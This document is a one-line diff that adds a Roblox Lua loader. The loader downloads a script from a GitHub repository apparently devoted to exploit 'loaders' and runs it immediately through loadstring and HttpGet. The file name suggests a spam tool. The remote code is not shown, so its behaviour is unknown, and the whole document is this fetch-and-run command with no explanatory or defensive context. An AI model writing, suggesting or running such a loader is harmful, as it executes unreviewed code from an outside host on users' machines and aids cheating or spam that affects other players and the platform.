@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/beta-buddytime-spam4-3365iiv6lpo7sg.lua"))()
